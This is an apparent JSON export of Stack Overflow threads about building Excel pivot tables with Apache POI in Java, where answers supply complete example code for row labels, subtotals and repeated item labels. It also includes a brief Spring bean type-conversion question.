pivotTable.getCTPivotTableDefinition().getDataFields().getDataFieldArray(1).setNumFmtId(numFmtId);\t\r\n\t\t\t pivotTable.getCTPivotTableDefinition().getPivotTableStyleInfo().setName(&quot;PivotStyleMedium10&quot;);\r\n\t\r\n\r\nI tried many ways but I didn&#39;t find any answer. \r\n","title":"How to set default value for row labels in pivot table using poi","body":"<p>I am working with excel reports. I need to generate pivot table with some particular field as default value in row labels rather selecting all fields. I am using apache POI.</p>\n\n<p><a href=\"https://i.stack.imgur.com/338lU.png\" rel=\"nofollow noreferrer\">This what I am getting automatically when I load excel sheet</a></p>\n\n<p><a href=\"https://i.stack.imgur.com/2YALU.png\" rel=\"nofollow noreferrer\">This is what I need</a></p>\n\n<pre><code>AreaReference source = new AreaReference(\"A1:D5\", SpreadsheetVersion.EXCEL2007);\n        CellReference position = new CellReference(10,0);\n\n         XSSFPivotTable pivotTable = sheet1.createPivotTable(source, position,wb.getSheet(\"1econtent\"));\n\n         pivotTable.addReportFilter(2);\n         pivotTable.addRowLabel(0);\n\n         pivotTable.addColumnLabel(DataConsolidateFunction.SUM, 1);\n         pivotTable.addColumnLabel(DataConsolidateFunction.SUM, 1,\"% of value\");\n\n         pivotTable.getCTPivotTableDefinition().getDataFields().getDataFieldArray(1).setShowDataAs(org.openxmlformats.schemas.spreadsheetml.x2006.main.STShowDataAs.PERCENT_OF_COL);\n         DataFormat dataformat = wb.createDataFormat();\n         short numFmtId = dataformat.getFormat(\"0.00%\");\n         pivotTable.getCTPivotTableDefinition().getDataFields().getDataFieldArray(1).setNumFmtId(numFmtId); \n         pivotTable.getCTPivotTableDefinition().getPivotTableStyleInfo().setName(\"PivotStyleMedium10\");\n</code></pre>\n\n<p>I tried many ways but I didn't find any answer. </p>\n"},{"tags":["java","apache-poi","pivot-table"],"comments":[{"owner":{"account_id":4853829,"reputation":57305,"user_id":3915431,"display_name":"Axel Richter"},"score":0,"creation_date":1572016320,"post_id":58560484,"comment_id":103441404,"body_markdown":"We need a [Minimal, Reproducible Example](https://stackoverflow.com/help/minimal-reproducible-example). Using your provided code, nobody can reproduce your issue without having the data in your Excel sheet. Nobody, at least not I, will creating that sheet manually by guessing the data. So please provide code which creates the data also. And please provide **complete** code. Possible helpers should be able copy-&gt;paste-&gt;compile-&gt;run that provided code.","body":"We need a <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">Minimal, Reproducible Example</a>. Using your provided code, nobody can reproduce your issue without having the data in your Excel sheet. Nobody, at least not I, will creating that sheet manually by guessing the data. So please provide code which creates the data also. And please provide <b>complete</b> code. Possible helpers should be able copy-&gt;paste-&gt;compile-&gt;run that provided code."},{"owner":{"account_id":16920792,"reputation":3,"user_id":12237662,"display_name":"Rohit"},"score":0,"creation_date":1572020158,"post_id":58560484,"comment_id":103443263,"body_markdown":"HI Axel, Added the updated code which contains excel data as well.","body":"HI Axel, Added the updated code which contains excel data as well."}],"answers":[{"tags":[],"owner":{"account_id":4853829,"reputation":57305,"user_id":3915431,"display_name":"Axel Richter"},"down_vote_count":0,"up_vote_count":1,"is_accepted":true,"score":1,"last_activity_date":1640268594,"creation_date":1572026755,"answer_id":58563597,"question_id":58560484,"body_markdown":"The problem is how you are building the pivot table definition and the pivot cache definition. This must be done because `apache poi` creates as much fields for each row label as rows are in the pivot table data range. This is wrong when special settings shall be made for pivot fields. You try to do that, but you do it wrong.\r\n\r\nI cannot go into detail where exactly you go wrong because  that would be too much effort. But what needs to be done is:\r\n\r\nFor each column which is row label:\r\n\r\n - Determine unique labels in that column. This is necessary to build\r\n   the cache.\r\n\r\nThen build pivot table and cache.\r\n\r\nFor each unique label:\r\n\r\n - Build pivot field item as numbered item. \r\n - Build a cache definition which has a shared element for this label.\r\n\r\nThen remove further items from pivot table definition. But leave **one** default element there, if there should be subtotals. If not, then not.\r\n\r\nComplete example:\r\n\r\n    import org.apache.poi.xssf.usermodel.*;\r\n    import org.apache.poi.ss.usermodel.*;\r\n    import org.apache.poi.ss.util.*;\r\n    import org.apache.poi.ss.*;\r\n    import java.io.*;\r\n    import java.util.ArrayList;\r\n    import java.util.TreeSet;\r\n    import java.util.List;\r\n    import org.openxmlformats.schemas.spreadsheetml.x2006.main.*;\r\n    \r\n    class TestPivotTables {\r\n     public static void main(String[] args) throws IOException{\r\n      Workbook wb = new XSSFWorkbook();\r\n      String[][] data = new String[][]{\r\n       {&quot;STATUS&quot;,&quot;PASSED&quot;,&quot;DATA&quot;,&quot;VALUE&quot;}, \r\n       {&quot;BLUE&quot;,&quot;Y&quot;,&quot;TTT&quot;,&quot;20&quot;},\r\n       {&quot;RED&quot;,&quot;N&quot;,&quot;UUU&quot;,&quot;10&quot;},\r\n       {&quot;BLUE&quot;,&quot;N&quot;,&quot;PPP&quot;,&quot;30&quot;}\r\n      };\r\n    \r\n      XSSFSheet sheet = (XSSFSheet) wb.createSheet(&quot;data&quot;);\r\n      XSSFSheet pivot = (XSSFSheet) wb.createSheet(&quot;summary&quot;);\r\n      for(String[] dataRow : data){\r\n       XSSFRow row = sheet.createRow(sheet.getPhysicalNumberOfRows());\r\n       for(String dataCell : dataRow){\r\n        XSSFCell cell = row.createCell(row.getPhysicalNumberOfCells());\r\n        cell.setCellValue(dataCell);\r\n       }\r\n      }\r\n    \r\n      AreaReference areaReference = new AreaReference(&quot;A1:D4&quot;, SpreadsheetVersion.EXCEL2007);\r\n      XSSFPivotTable pivotTable = pivot.createPivotTable(areaReference, new CellReference(&quot;A4&quot;), sheet);\r\n    \r\n      pivotTable.getCTPivotTableDefinition().setRowHeaderCaption(&quot;Colour&quot;);\r\n    \r\n      List&lt;Integer&gt; iterList = new ArrayList&lt;Integer&gt;();\r\n      iterList.add(0);\r\n      iterList.add(2);\r\n      iterList.add(1);\r\n    \r\n      for (Integer j : iterList) {\r\n    \r\n       //create row label - apache poi creates as much fields for each as rows are in the pivot table data range\r\n       pivotTable.addRowLabel(j);\r\n    \r\n       //determine unique labels in column j\r\n       TreeSet&lt;String&gt; uniqueItems = new java.util.TreeSet&lt;String&gt;(String.CASE_INSENSITIVE_ORDER);\r\n       for (int r = areaReference.getFirstCell().getRow()+1; r &lt; areaReference.getLastCell().getRow()+1; r++) {\r\n        uniqueItems.add(sheet.getRow(r).getCell(j).getStringCellValue());\r\n       }\r\n       System.out.println(uniqueItems);\r\n       \r\n       //build pivot table and cache\r\n       CTPivotField ctPivotField = pivotTable.getCTPivotTableDefinition().getPivotFields().getPivotFieldArray(j);\r\n       int i = 0;\r\n       for (String item : uniqueItems) {\r\n        //take the items as numbered items: &lt;item x=&quot;0&quot;/&gt;&lt;item x=&quot;1&quot;/&gt;\r\n        ctPivotField.getItems().getItemArray(i).unsetT();\r\n        ctPivotField.getItems().getItemArray(i).setX((long)i);\r\n        //build a cache definition which has shared elements for those items \r\n        //&lt;sharedItems&gt;&lt;s v=&quot;BLUE&quot;/&gt;&lt;s v=&quot;RED&quot;/&gt;&lt;/sharedItems&gt;\r\n        pivotTable.getPivotCacheDefinition().getCTPivotCacheDefinition().getCacheFields().getCacheFieldArray(j)\r\n         .getSharedItems().addNewS().setV(item);\r\n        i++;\r\n       }\r\n    \r\n       ctPivotField.setAutoShow(false);\r\n       ctPivotField.setDefaultSubtotal(false);\r\n       //ctPivotField.setSubtotalTop(false);\r\n       //ctPivotField.setSubtotalCaption(null);\r\n       ctPivotField.setCompact(false);\r\n    \r\n       //remove further items\r\n       if (ctPivotField.getDefaultSubtotal()) i++; //let one default item be if there shall be subtotals\r\n       for (int k = ctPivotField.getItems().getItemList().size()-1; k &gt;= i; k--) {\r\n        ctPivotField.getItems().removeItem(k);\r\n       }\r\n       ctPivotField.getItems().setCount(i);\r\n       \r\n      }\r\n    \r\n      System.out.println(&quot;----end---&quot;);\r\n    \r\n      pivotTable.addColumnLabel(DataConsolidateFunction.COUNT, 3, &quot;test&quot;);\r\n    \r\n      FileOutputStream fileOut = new FileOutputStream(&quot;pivotsample1.xlsx&quot;);\r\n      wb.write(fileOut);\r\n      fileOut.close();\r\n      wb.close();\r\n     }\r\n    }\r\n\r\n","title":"Getting Exception when reorder RowLabel when hiding the Subtotal -Apache POI","body":"<p>The problem is how you are building the pivot table definition and the pivot cache definition. This must be done because <code>apache poi</code> creates as much fields for each row label as rows are in the pivot table data range. This is wrong when special settings shall be made for pivot fields. You try to do that, but you do it wrong.</p>\n<p>I cannot go into detail where exactly you go wrong because  that would be too much effort. But what needs to be done is:</p>\n<p>For each column which is row label:</p>\n<ul>\n<li>Determine unique labels in that column. This is necessary to build\nthe cache.</li>\n</ul>\n<p>Then build pivot table and cache.</p>\n<p>For each unique label:</p>\n<ul>\n<li>Build pivot field item as numbered item.</li>\n<li>Build a cache definition which has a shared element for this label.</li>\n</ul>\n<p>Then remove further items from pivot table definition. But leave <strong>one</strong> default element there, if there should be subtotals. If not, then not.</p>\n<p>Complete example:</p>\n<pre><code>import org.apache.poi.xssf.usermodel.*;\nimport org.apache.poi.ss.usermodel.*;\nimport org.apache.poi.ss.util.*;\nimport org.apache.poi.ss.*;\nimport java.io.*;\nimport java.util.ArrayList;\nimport java.util.TreeSet;\nimport java.util.List;\nimport org.openxmlformats.schemas.spreadsheetml.x2006.main.*;\n\nclass TestPivotTables {\n public static void main(String[] args) throws IOException{\n  Workbook wb = new XSSFWorkbook();\n  String[][] data = new String[][]{\n   {&quot;STATUS&quot;,&quot;PASSED&quot;,&quot;DATA&quot;,&quot;VALUE&quot;}, \n   {&quot;BLUE&quot;,&quot;Y&quot;,&quot;TTT&quot;,&quot;20&quot;},\n   {&quot;RED&quot;,&quot;N&quot;,&quot;UUU&quot;,&quot;10&quot;},\n   {&quot;BLUE&quot;,&quot;N&quot;,&quot;PPP&quot;,&quot;30&quot;}\n  };\n\n  XSSFSheet sheet = (XSSFSheet) wb.createSheet(&quot;data&quot;);\n  XSSFSheet pivot = (XSSFSheet) wb.createSheet(&quot;summary&quot;);\n  for(String[] dataRow : data){\n   XSSFRow row = sheet.createRow(sheet.getPhysicalNumberOfRows());\n   for(String dataCell : dataRow){\n    XSSFCell cell = row.createCell(row.getPhysicalNumberOfCells());\n    cell.setCellValue(dataCell);\n   }\n  }\n\n  AreaReference areaReference = new AreaReference(&quot;A1:D4&quot;, SpreadsheetVersion.EXCEL2007);\n  XSSFPivotTable pivotTable = pivot.createPivotTable(areaReference, new CellReference(&quot;A4&quot;), sheet);\n\n  pivotTable.getCTPivotTableDefinition().setRowHeaderCaption(&quot;Colour&quot;);\n\n  List&lt;Integer&gt; iterList = new ArrayList&lt;Integer&gt;();\n  iterList.add(0);\n  iterList.add(2);\n  iterList.add(1);\n\n  for (Integer j : iterList) {\n\n   //create row label - apache poi creates as much fields for each as rows are in the pivot table data range\n   pivotTable.addRowLabel(j);\n\n   //determine unique labels in column j\n   TreeSet&lt;String&gt; uniqueItems = new java.util.TreeSet&lt;String&gt;(String.CASE_INSENSITIVE_ORDER);\n   for (int r = areaReference.getFirstCell().getRow()+1; r &lt; areaReference.getLastCell().getRow()+1; r++) {\n    uniqueItems.add(sheet.getRow(r).getCell(j).getStringCellValue());\n   }\n   System.out.println(uniqueItems);\n   \n   //build pivot table and cache\n   CTPivotField ctPivotField = pivotTable.getCTPivotTableDefinition().getPivotFields().getPivotFieldArray(j);\n   int i = 0;\n   for (String item : uniqueItems) {\n    //take the items as numbered items: &lt;item x=&quot;0&quot;/&gt;&lt;item x=&quot;1&quot;/&gt;\n    ctPivotField.getItems().getItemArray(i).unsetT();\n    ctPivotField.getItems().getItemArray(i).setX((long)i);\n    //build a cache definition which has shared elements for those items \n    //&lt;sharedItems&gt;&lt;s v=&quot;BLUE&quot;/&gt;&lt;s v=&quot;RED&quot;/&gt;&lt;/sharedItems&gt;\n    pivotTable.getPivotCacheDefinition().getCTPivotCacheDefinition().getCacheFields().getCacheFieldArray(j)\n     .getSharedItems().addNewS().setV(item);\n    i++;\n   }\n\n   ctPivotField.setAutoShow(false);\n   ctPivotField.setDefaultSubtotal(false);\n   //ctPivotField.setSubtotalTop(false);\n   //ctPivotField.setSubtotalCaption(null);\n   ctPivotField.setCompact(false);\n\n   //remove further items\n   if (ctPivotField.getDefaultSubtotal()) i++; //let one default item be if there shall be subtotals\n   for (int k = ctPivotField.getItems().getItemList().size()-1; k &gt;= i; k--) {\n    ctPivotField.getItems().removeItem(k);\n   }\n   ctPivotField.getItems().setCount(i);\n   \n  }\n\n  System.out.println(&quot;----end---&quot;);\n\n  pivotTable.addColumnLabel(DataConsolidateFunction.COUNT, 3, &quot;test&quot;);\n\n  FileOutputStream fileOut = new FileOutputStream(&quot;pivotsample1.xlsx&quot;);\n  wb.write(fileOut);\n  fileOut.close();\n  wb.close();\n }\n}\n</code></pre>\n"}],"owner":{"account_id":16920792,"reputation":3,"user_id":12237662,"display_name":"Rohit"},"comment_count":2,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":281,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"accepted_answer_id":58563597,"answer_count":1,"score":0,"last_activity_date":1640268594,"creation_date":1572013722,"question_id":58560484,"body_markdown":"As per below code i dont want to add addRowLabel(1) but need addRowLabel(2) . After running the application and open the pivot table its giving exception but if you add addRowLabel(1)(currently commented) its working as expected. This is happening after adding the logic to hide Subtotal. Is this is the expected behaviour of apache POI or It can be fixed?\r\n  Please find the  code below. \r\nNote: This issue comes when hiding subtotal. \r\n\r\n      package com.test.pivottables;\r\n      import org.apache.poi.xssf.usermodel.*;\r\n      import org.apache.poi.ss.usermodel.*;\r\n       import org.apache.poi.ss.util.*;\r\n         import org.apache.poi.ss.*;\r\n       import java.io.*;\r\n       import java.util.ArrayList;\r\n      import java.util.HashSet;\r\n       import java.util.Iterator;\r\n     import java.util.List;\r\n     import java.util.Set;\r\n      import org.openxmlformats.schemas.spreadsheetml.x2006.main.*;\r\n     class TestPivotTables {\r\n      public static void main(String[] args) throws IOException{\r\n\t\tWorkbook wb = new XSSFWorkbook();\r\n\t\tString[][] data = new String[][]{{&quot;STATUS&quot;,&quot;PASSED&quot;,&quot;DATA&quot;,&quot;VALUE&quot;}, \r\n      {&quot;BLUE&quot;,&quot;Y&quot;,&quot;TTT&quot;,&quot;20&quot;},\r\n     {&quot;RED&quot;,&quot;N&quot;,&quot;UUU&quot;,&quot;10&quot;},{&quot;BLUE&quot;,&quot;N&quot;,&quot;PPP&quot;,&quot;30&quot;}};\r\n\r\n\t\tXSSFSheet sheet = (XSSFSheet) wb.createSheet(&quot;data&quot;);\r\n\t\tXSSFSheet pivot = (XSSFSheet) wb.createSheet(&quot;summary&quot;);\r\n\t\tfor(String[] dataRow : data){\r\n\t\t\tXSSFRow row = sheet.createRow(sheet.getPhysicalNumberOfRows());\r\n\t\t\tfor(String dataCell : dataRow){\r\n\t\t\t\tXSSFCell cell = \r\n            row.createCell(row.getPhysicalNumberOfCells());\r\n\t\t\t\tcell.setCellValue(dataCell);\r\n\t\t\t}\r\n\t\t}\r\n\r\n\t\tXSSFTable table = sheet.createTable();    \r\n\t\tCTTable cttable = table.getCTTable();\r\n\t\ttable.setDisplayName(&quot;table&quot;);\r\n\t\tcttable.setRef(&quot;A1:D4&quot;);\r\n\t\tcttable.setId(1);\r\n\r\n\t\tCTTableColumns columns = cttable.addNewTableColumns();\r\n\t\tcolumns.setCount(3);\r\n\r\n\t\tint i = 1;\r\n\t\tfor (String colName : data[0]){\r\n\t\t\tCTTableColumn column = columns.addNewTableColumn();\r\n\t\t\tcolumn.setId(++i);\r\n\t\t\tcolumn.setName(colName);      \r\n\t\t}\r\n\r\n\t\tXSSFPivotTable pivotTable =  pivot.createPivotTable(new \r\n     AreaReference(&quot;A1:D4&quot;, SpreadsheetVersion.EXCEL2007),\r\n    new CellReference(&quot;A4&quot;), sheet);\r\n\r\n\t\tpivotTable.addRowLabel(0);\r\n\t\tpivotTable.addRowLabel(2);\r\n\t\t//pivotTable.addRowLabel(1);\r\n\r\n\t\tList&lt;Integer&gt; iterList = new ArrayList&lt;Integer&gt;();\r\n\t\titerList.add(0);\r\n\t\titerList.add(2);\r\n\t\t//iterList.add(1);\r\n\t\tpivotTable.getCTPivotTableDefinition().setRowHeaderCaption(&quot;Colour&quot;);\r\n       for (int j=0;j&lt;iterList.size();j++) {\r\n\t\t\tCTPivotField ctPivotField = \r\n       pivotTable.getCTPivotTableDefinition().getPivotFields().\r\n      getPivotFieldList().get(iterList.get(j));\r\n\t\t\tfor (i = 0; i &lt; sheet.getLastRowNum()-1; i++) {\r\n\t\t\t\tif(ctPivotField.getItems().getItemArray(i)!=null) {\r\n\t\t\t\t\tctPivotField.getItems().getItemArray(i).unsetT();\r\n\t\t\t\t\tctPivotField.getItems().getItemArray(i).setX((long)i);\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t\tfor (i = sheet.getLastRowNum(); i &gt; sheet.getLastRowNum()-2; i--) \r\n      {\r\n\t\t\t\tif(ctPivotField.getItems().getItemArray(i)!=null) {\r\n\t\t\t\t\tctPivotField.getItems().removeItem(i);\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t\tctPivotField.getItems().setCount(2);\r\n\r\n\t\t\tSet&lt;String&gt; collection = new HashSet&lt;String&gt;();\r\n\t\t\tint ctr = 0;\r\n\t\t\tRow row = null;\r\n\t\t\tCell cell = null;\r\n\t\t\tboolean isNull = false;\r\n\t\t\tdo{\r\n\t\t\t\ttry{\r\n\t\t\t\t\trow = sheet.getRow(ctr);\r\n\t\t\t\t\tcell = row.getCell(0);\r\n\t\t\t\t\tcollection.add(cell.toString());\r\n\t\t\t\t\tctr++;\r\n\t\t\t\t} catch(Exception e) {\r\n\t\t\t\t\tisNull = true;\r\n\t\t\t\t}\r\n\t\t\t}while(isNull!=true);\r\n\t\t\tif(collection!=null &amp;&amp; collection.size()&gt;0) {\r\n\t\t\t\tIterator value = collection.iterator(); \r\n\t\t\t\twhile (value.hasNext()) { \r\n\t\t\t\t\tpivotTable.getPivotCacheDefinition().\r\n      getCTPivotCacheDefinition().getCacheFields().\r\n      getCacheFieldList().get(j).getSharedItems().addNewS().\r\n      setV(value.next().toString()); \r\n\t\t\t\t} \r\n\t\t\t}\r\n\t\t\tctPivotField.setAutoShow(false);\r\n\t\t\tctPivotField.setDefaultSubtotal(false);\r\n\t\t\tctPivotField.setSubtotalTop(false);\r\n\t\t\tctPivotField.setSubtotalCaption(null);\r\n\t\t\tctPivotField.setCompact(false);\r\n\t\t}\r\n\t\tSystem.out.println(&quot;----end---&quot;);\r\n\t\tpivotTable.addColumnLabel(DataConsolidateFunction.COUNT, 3, &quot;test&quot;);\r\n\r\n\t\tFileOutputStream fileOut = new FileOutputStream(&quot;pivotsample1.xlsx&quot;);\r\n\t\twb.write(fileOut);\r\n\t\twb.close();\r\n\r\n\t}}","title":"Getting Exception when reorder RowLabel when hiding the Subtotal -Apache POI","body":"<p>As per below code i dont want to add addRowLabel(1) but need addRowLabel(2) . After running the application and open the pivot table its giving exception but if you add addRowLabel(1)(currently commented) its working as expected. This is happening after adding the logic to hide Subtotal. Is this is the expected behaviour of apache POI or It can be fixed?\n  Please find the  code below. \nNote: This issue comes when hiding subtotal. </p>\n\n<pre><code>  package com.test.pivottables;\n  import org.apache.poi.xssf.usermodel.*;\n  import org.apache.poi.ss.usermodel.*;\n   import org.apache.poi.ss.util.*;\n     import org.apache.poi.ss.*;\n   import java.io.*;\n   import java.util.ArrayList;\n  import java.util.HashSet;\n   import java.util.Iterator;\n import java.util.List;\n import java.util.Set;\n  import org.openxmlformats.schemas.spreadsheetml.x2006.main.*;\n class TestPivotTables {\n  public static void main(String[] args) throws IOException{\n    Workbook wb = new XSSFWorkbook();\n    String[][] data = new String[][]{{\"STATUS\",\"PASSED\",\"DATA\",\"VALUE\"}, \n  {\"BLUE\",\"Y\",\"TTT\",\"20\"},\n {\"RED\",\"N\",\"UUU\",\"10\"},{\"BLUE\",\"N\",\"PPP\",\"30\"}};\n\n    XSSFSheet sheet = (XSSFSheet) wb.createSheet(\"data\");\n    XSSFSheet pivot = (XSSFSheet) wb.createSheet(\"summary\");\n    for(String[] dataRow : data){\n        XSSFRow row = sheet.createRow(sheet.getPhysicalNumberOfRows());\n        for(String dataCell : dataRow){\n            XSSFCell cell = \n        row.createCell(row.getPhysicalNumberOfCells());\n            cell.setCellValue(dataCell);\n        }\n    }\n\n    XSSFTable table = sheet.createTable();    \n    CTTable cttable = table.getCTTable();\n    table.setDisplayName(\"table\");\n    cttable.setRef(\"A1:D4\");\n    cttable.setId(1);\n\n    CTTableColumns columns = cttable.addNewTableColumns();\n    columns.setCount(3);\n\n    int i = 1;\n    for (String colName : data[0]){\n        CTTableColumn column = columns.addNewTableColumn();\n        column.setId(++i);\n        column.setName(colName);      \n    }\n\n    XSSFPivotTable pivotTable =  pivot.createPivotTable(new \n AreaReference(\"A1:D4\", SpreadsheetVersion.EXCEL2007),\nnew CellReference(\"A4\"), sheet);\n\n    pivotTable.addRowLabel(0);\n    pivotTable.addRowLabel(2);\n    //pivotTable.addRowLabel(1);\n\n    List&lt;Integer&gt; iterList = new ArrayList&lt;Integer&gt;();\n    iterList.add(0);\n    iterList.add(2);\n    //iterList.add(1);\n    pivotTable.getCTPivotTableDefinition().setRowHeaderCaption(\"Colour\");\n   for (int j=0;j&lt;iterList.size();j++) {\n        CTPivotField ctPivotField = \n   pivotTable.getCTPivotTableDefinition().getPivotFields().\n  getPivotFieldList().get(iterList.get(j));\n        for (i = 0; i &lt; sheet.getLastRowNum()-1; i++) {\n            if(ctPivotField.getItems().getItemArray(i)!=null) {\n                ctPivotField.getItems().getItemArray(i).unsetT();\n                ctPivotField.getItems().getItemArray(i).setX((long)i);\n            }\n        }\n        for (i = sheet.getLastRowNum(); i &gt; sheet.getLastRowNum()-2; i--) \n  {\n            if(ctPivotField.getItems().getItemArray(i)!=null) {\n                ctPivotField.getItems().removeItem(i);\n            }\n        }\n        ctPivotField.getItems().setCount(2);\n\n        Set&lt;String&gt; collection = new HashSet&lt;String&gt;();\n        int ctr = 0;\n        Row row = null;\n        Cell cell = null;\n        boolean isNull = false;\n        do{\n            try{\n                row = sheet.getRow(ctr);\n                cell = row.getCell(0);\n                collection.add(cell.toString());\n                ctr++;\n            } catch(Exception e) {\n                isNull = true;\n            }\n        }while(isNull!=true);\n        if(collection!=null &amp;&amp; collection.size()&gt;0) {\n            Iterator value = collection.iterator(); \n            while (value.hasNext()) { \n                pivotTable.getPivotCacheDefinition().\n  getCTPivotCacheDefinition().getCacheFields().\n  getCacheFieldList().get(j).getSharedItems().addNewS().\n  setV(value.next().toString()); \n            } \n        }\n        ctPivotField.setAutoShow(false);\n        ctPivotField.setDefaultSubtotal(false);\n        ctPivotField.setSubtotalTop(false);\n        ctPivotField.setSubtotalCaption(null);\n        ctPivotField.setCompact(false);\n    }\n    System.out.println(\"----end---\");\n    pivotTable.addColumnLabel(DataConsolidateFunction.COUNT, 3, \"test\");\n\n    FileOutputStream fileOut = new FileOutputStream(\"pivotsample1.xlsx\");\n    wb.write(fileOut);\n    wb.close();\n\n}}\n</code></pre>\n"},{"tags":["java","spring"],"answers":[{"tags":[],"owner":{"account_id":20620422,"reputation":61,"user_id":15137572,"display_name":"tw_ob"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1640268559,"creation_date":1640268559,"answer_id":70463249,"question_id":70459073,"body_markdown":"I should have created org.springframework.context.support.ConversionServiceFactoryBean\r\nand generated a String to Type converter class","title":"spring failed to convert value of type &#39;java.lang.String&#39; to required type &#39;java.lang.reflect.Type&#39;","body":"<p>I should have created org.springframework.context.support.ConversionServiceFactoryBean\nand generated a String to Type converter class</p>\n"}],"owner":{"account_id":20620422,"reputation":61,"user_id":15137572,"display_name":"tw_ob"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":116,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"answer_count":1,"score":0,"last_activity_date":1640268559,"creation_date":1640245408,"question_id":70459073,"body_markdown":"I am using a library that has this bean defied:\r\n```\r\n&lt;bean id=&quot;campaignCpcCacheClientFactory&quot; class=&quot;com.mycompany.infra.cache.folsom.MemcachedClientFactory&quot; factory-method=&quot;createClientFactory&quot; lazy-init=&quot;true&quot;&gt;\r\n    &lt;constructor-arg name=&quot;clientType&quot; value=&quot;JSON&quot;/&gt;\r\n    &lt;constructor-arg name=&quot;cacheName&quot; value=&quot;CampaignCpcCache&quot;/&gt;\r\n    &lt;constructor-arg name=&quot;keyTranslator&quot;&gt;\r\n      &lt;bean class=&quot;com.mycompany.cpc.cachekey.CpcFeaturesCacheKeyTranslator&quot;&gt;\r\n        &lt;constructor-arg value=&quot;CampaignCPC&quot;/&gt;\r\n      &lt;/bean&gt;\r\n    &lt;/constructor-arg&gt;\r\n    &lt;constructor-arg name=&quot;valueType&quot; value=&quot;com.mycompany.cpc.CampaignCpc&quot;/&gt;\r\n    &lt;constructor-arg name=&quot;expirationSeconds&quot; value=&quot;${com.mycompany.cpcfeatures.memcache.ttl_seconds}&quot;/&gt;\r\n    &lt;property name=&quot;consulClusterName&quot; value=&quot;${com.mycompany.cpcfeatures.memcache.cluster.name}&quot;/&gt;\r\n    &lt;property name=&quot;targetsRefreshPeriod&quot; value=&quot;10000&quot;/&gt;\r\n  &lt;/bean&gt;\r\n```\r\n\r\nwhen I inject this bean as a constructor arg to my own object (on xml)\r\nthis crushes on startup, saying:\r\n\r\nFailed to create that bean. could not convert factory method argument value of type [java.lang.String] to required type [java.lang.reflect.Type].Unsatisfied dependency expressed through constructor argument with index 3 of type [java.lang.reflect.Type]\r\nno matching editors or conversion strategy found\r\n\r\nArg#3 is com.mycompany.cpc.CampaignCpc which is a class on the same dependency module.\r\n\r\nOther modules at the same project use that bean and don&#39;t have any trouble loading. ","title":"spring failed to convert value of type &#39;java.lang.String&#39; to required type &#39;java.lang.reflect.Type&#39;","body":"<p>I am using a library that has this bean defied:</p>\n<pre><code>&lt;bean id=&quot;campaignCpcCacheClientFactory&quot; class=&quot;com.mycompany.infra.cache.folsom.MemcachedClientFactory&quot; factory-method=&quot;createClientFactory&quot; lazy-init=&quot;true&quot;&gt;\n    &lt;constructor-arg name=&quot;clientType&quot; value=&quot;JSON&quot;/&gt;\n    &lt;constructor-arg name=&quot;cacheName&quot; value=&quot;CampaignCpcCache&quot;/&gt;\n    &lt;constructor-arg name=&quot;keyTranslator&quot;&gt;\n      &lt;bean class=&quot;com.mycompany.cpc.cachekey.CpcFeaturesCacheKeyTranslator&quot;&gt;\n        &lt;constructor-arg value=&quot;CampaignCPC&quot;/&gt;\n      &lt;/bean&gt;\n    &lt;/constructor-arg&gt;\n    &lt;constructor-arg name=&quot;valueType&quot; value=&quot;com.mycompany.cpc.CampaignCpc&quot;/&gt;\n    &lt;constructor-arg name=&quot;expirationSeconds&quot; value=&quot;${com.mycompany.cpcfeatures.memcache.ttl_seconds}&quot;/&gt;\n    &lt;property name=&quot;consulClusterName&quot; value=&quot;${com.mycompany.cpcfeatures.memcache.cluster.name}&quot;/&gt;\n    &lt;property name=&quot;targetsRefreshPeriod&quot; value=&quot;10000&quot;/&gt;\n  &lt;/bean&gt;\n</code></pre>\n<p>when I inject this bean as a constructor arg to my own object (on xml)\nthis crushes on startup, saying:</p>\n<p>Failed to create that bean. could not convert factory method argument value of type [java.lang.String] to required type [java.lang.reflect.Type].Unsatisfied dependency expressed through constructor argument with index 3 of type [java.lang.reflect.Type]\nno matching editors or conversion strategy found</p>\n<p>Arg#3 is com.mycompany.cpc.CampaignCpc which is a class on the same dependency module.</p>\n<p>Other modules at the same project use that bean and don't have any trouble loading.</p>\n"},{"tags":["javascript","java","apache-poi","pivot-table"],"comments":[{"owner":{"account_id":17089866,"reputation":55,"user_id":12366270,"display_name":"Vijay"},"score":0,"creation_date":1573739225,"post_id":58848489,"comment_id":103987767,"body_markdown":"Hi All, Can we achieve the &quot;Repeat All Items Label&quot; from apache POI.","body":"Hi All, Can we achieve the &quot;Repeat All Items Label&quot; from apache POI."}],"answers":[{"tags":[],"owner":{"account_id":4853829,"reputation":57305,"user_id":3915431,"display_name":"Axel Richter"},"down_vote_count":0,"up_vote_count":0,"is_accepted":true,"score":0,"last_activity_date":1640268536,"creation_date":1574015776,"answer_id":58903846,"question_id":58848489,"body_markdown":"The &quot;Repeat All Items Label&quot; setting for pivot tables was implemented after the `Office Open XML` was published. That&#39;s why it is not part of it. It uses special extended `XML` from name space `x14`. But `apache poi` only provides `Office Open XML`.\r\n\r\nSo if we want using extended `XML` from name space `x14`, we need doing that on low `XML` level.\r\n\r\nFirst we need setting updated pivot table version to 6 instead of 3.\r\n\r\nThen we need set `&lt;x14:pivotField fillDownLabels=&quot;1&quot;/&gt;` for each `CTPivotField`. This is the &quot;Repeat All Items Label&quot; setting.\r\n\r\nComplete example which extends your showed code:\r\n\r\n    import org.apache.poi.xssf.usermodel.*;\r\n    import org.apache.poi.ss.usermodel.*;\r\n    import org.apache.poi.ss.util.*;\r\n    import org.apache.poi.ss.*;\r\n    import java.io.*;\r\n    import java.util.ArrayList;\r\n    import java.util.TreeSet;\r\n    import java.util.List;\r\n    import org.openxmlformats.schemas.spreadsheetml.x2006.main.*;\r\n    \r\n    public class TestPivotTable {\r\n     public static void main(String[] args) throws Exception {\r\n      Workbook wb = new XSSFWorkbook();\r\n      Object[][] data = new Object[][]{\r\n       {&quot;AAA&quot;,&quot;BBB&quot;,&quot;CCC&quot;,&quot;DDD&quot;,&quot;EEE&quot;,&quot;FFF&quot;,&quot;GGG&quot;,&quot;HHH&quot;}, \r\n       